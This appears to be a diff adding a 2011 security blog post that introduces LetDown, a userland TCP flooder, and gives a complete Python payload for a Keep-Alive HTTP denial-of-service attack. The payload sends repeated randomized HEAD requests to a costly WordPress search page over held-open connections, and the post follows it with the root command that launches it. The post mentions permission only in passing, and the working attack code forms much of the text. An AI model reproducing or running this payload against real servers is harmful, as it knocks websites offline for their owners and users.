@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>LetDown and HTTP DoS attacks</title>
+    <link href="css/main.css" rel="stylesheet" type="text/css">
+  </head>
+  
+  <body>
+    <article id="main">
+      <h1>LetDown and HTTP DoS attacks</h1>
+      <h2>21 Sep 2011</h2>
+      <br>
+
+      <p>These days much attention has turned to certain<strong> denial of service attacks</strong> that plague <strong>HTTP</strong>, also due to inherent vulnerabilities of the protocol itself.</p>
+
+      <p>I've read some nice pages and tools on various blogs/sites (e.g. <a href="http://www.esrun.co.uk/blog/keep-alive-dos-script/">Keep-Alive</a> DoS script and <a href="http://ha.ckers.org/slowloris/">Slowloris</a> have caught my attention).</p>
+
+      <p>Usually all the tools work well, but they have some drawbacks: each one <em>reimplements the wheel from scratch</em> and <em>uses standard operating system sockets</em> to send and receive data. Therefore they are slower and consume more memory than a full raw-socket approach.</p>
+
+      <p>In most cases, this is not a problem: just think about the tool <a href="http://ha.ckers.org/slowloris/">Slowloris</a> which has been specifically designed for low bandwidths. But there are also cases where we want to maximize the resources we have...</p>
+
+      <p>The problem with the use of raw sockets and packet sniffing is that they are difficult to implement quickly and easily.</p>
+
+      <p>For these reasons, some time ago, I developed <a href="http://complemento.sourceforge.net/">LetDown</a>, a tcp flooder that uses an indipendent <strong>userland TCP/IP stack</strong>, supports multistage payloads for complex protocols, and other interesting things (fragmentation of packets, variable tcp window, etc&hellip;) we won't analyze right now.</p>
+
+      <p>The advantage of using LetDown is that we can <strong>concentrate on the data transmitted</strong>, leaving out the algorithms and the programming part.</p>
+      
+      <h4>Keep-alive DoS via LetDown</h4>
+      
+      <p>Keep-alive Denial of Service concepts are:</p>
+      
+      <ul>
+	<li>The use of <strong>Keep-Alive</strong> HTTP header to maintain the connection open.</li>
+	<li>The use of <strong>HEAD</strong> requests to reduce network overhead.</li>
+	<li>Target a <strong>resource intensive page</strong> (a page that require interaction with databases, files, etc...).</li>
+      </ul>
+
+      <p>
+	You can read more here: <a href="http://www.esrun.co.uk/blog/keep-alive-dos-script/">http://www.esrun.co.uk/blog/keep-alive-dos-script/</a>. The author provides a php script that demonstrates the attack.
+      </p>
+
+
+      <p>We can rewrite that script as a <strong>multistage payload</strong>, i.e. a python script interpreted by the embedded python engine of letdown:</p>
+      
+      <pre style="background:#ffffff none repeat scroll 0 0;color:#000000;">
+
+<span style="color:#696969;">#</span>
+<span style="color:#696969;"># Letdown reimplementation of the attack</span>:
+<span style="color:#696969;"># Keep-Dead (Version 1.14)</span>
+<span style="color:#696969;"># http://www.esrun.co.uk/blog/keep-alive-dos-script/</span>
+<span style="color:#696969;">#</span>
+<span style="color:#696969;"># More info:</span>
+<span style="color:#696969;"># http://securityadventures.wordpress.com/</span>
+<span style="color:#696969;"># </span>
+  
+<span style="color:#800000;font-weight:bold;">import</span> random
+  
+<span style="color:#696969;"># Callback function</span>
+<span style="color:#800000;font-weight:bold;">def</span> callback<span style="color:#808030;">(</span>count<span style="color:#808030;">,</span> h_flags<span style="color:#808030;">,</span> h_payload<span style="color:#808030;">)</span><span style="color:#808030;">:</span>
+  
+<span style="color:#800000;font-weight:bold;">global</span> flags
+<span style="color:#800000;font-weight:bold;">global</span> window
+<span style="color:#800000;font-weight:bold;">global</span> action
+<span style="color:#800000;font-weight:bold;">global</span> payload
+  
+<span style="color:#696969;">#</span>
+<span style="color:#696969;"># Attack options</span>
+<span style="color:#696969;">#</span>
+
+<span style="color:#696969;"># target host</span>
+target_host <span style="color:#808030;">=</span> <span style="color:#0000e6;">"www.domain.net"</span>
+  
+<span style="color:#696969;"># target query</span>
+target_query <span style="color:#808030;">=</span> <span style="color:#0000e6;">"/wordpress/?s=%rand%"</span>
+  
+<span style="color:#696969;"># max requests per connection</span>
+max_requests_per_connection <span style="color:#808030;">=</span> <span style="color:#008c00;">100</span>
+  
+<span style="color:#696969;"># user agent</span>
+user_agent <span style="color:#808030;">=</span> <span style="color:#0000e6;">"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.44 Safari/534.7"</span>
+  
+<span style="color:#696969;">#</span>
+<span style="color:#696969;"># Send HTTP requests</span>
+<span style="color:#696969;">#</span>
+  
+<span style="color:#800000;font-weight:bold;">if</span> count <span style="color:#808030;">&lt;</span> max_requests_per_connection<span style="color:#808030;">:</span>
+  
+<span style="color:#696969;"># packet settings</span>
+flags   <span style="color:#808030;">=</span> ack
+window  <span style="color:#808030;">=</span> <span style="color:#008c00;">1024</span>
+action  <span style="color:#808030;">=</span> act_wait
+  
+<span style="color:#696969;"># HTTP request</span>
+payload  <span style="color:#808030;">=</span> <span style="color:#0000e6;">"HEAD "</span> <span style="color:#808030;">+</span> target_query<span style="color:#808030;">.</span>replace<span style="color:#808030;">(</span><span style="color:#0000e6;">'%rand%'</span><span style="color:#808030;">,</span><span style="color:#e34adc;">str</span><span style="color:#808030;">(</span>random<span style="color:#808030;">.</span>getrandbits<span style="color:#808030;">(</span><span style="color:#008c00;">20</span><span style="color:#808030;">)</span><span style="color:#808030;">)</span><span style="color:#808030;">)</span> <span style="color:#808030;">+</span> <span style="color:#0000e6;">" HTTP/1.1\r\n"</span>
+payload <span style="color:#808030;">+</span><span style="color:#808030;">=</span> <span style="color:#0000e6;">"Host: "</span> <span style="color:#808030;">+</span> target_host <span style="color:#808030;">+</span> <span style="color:#0000e6;">"\r\n"</span>
+payload <span style="color:#808030;">+</span><span style="color:#808030;">=</span> <span style="color:#0000e6;">"User-Agent: "</span> <span style="color:#808030;">+</span> user_agent <span style="color:#808030;">+</span> <span style="color:#0000e6;">"\r\n"</span>
+payload <span style="color:#808030;">+</span><span style="color:#808030;">=</span> <span style="color:#0000e6;">"Connection: Keep-Alive\r\n\r\n"</span>
+  
+<span style="color:#696969;">#</span>
+<span style="color:#696969;"># Close the connection</span>
+<span style="color:#696969;">#</span>
+  
+<span style="color:#800000;font-weight:bold;">else</span><span style="color:#808030;">:</span>
+flags   <span style="color:#808030;">=</span> rst
+action  <span style="color:#808030;">=</span> act_wait
+      </pre>
+      
+      <p>As you can see we did not need to program anything to manage the connection. These tasks are entirely managed by LetDown, via raw sockets and libpcap.</p>
+
+      <p>The only options specified are the <strong>contents</strong> of the TCP packet (the payload), and the <strong>action</strong> to perform (act_wait means: send the packet and wait for an acknowledgement packet from the server).</p>
+
+      <p>We can now lauch the attack with this command:</p>
+      
+      <pre>root@box# letdown -d DESTINATION_IP -D GATEWAY_MAC -p 80 -M payloads/http-keep-alive.py -f iptables -v 2</pre>
+      
+      <p>Of course, these attacks are allowed only if directed against <em>machines on which we have permission to conduct tests</em>. Before using it you should also give a look at the <strong>guide</strong> (<a href="http://complemento.sourceforge.net/howto/index.html">http://complemento.sourceforge.net/howto/index.html</a>) in order to understand low-level operations of the tool, and be able to identify the causes of the eventual errors.</p>
+
+      <p><strong>PS:</strong> The script can probably be optimized against the specific target <em>introducing appropriate delays</em> (in the base form it's only a Proof-of-Concept).</p>
+      
+
+    </article>
+  </body>
+</html>
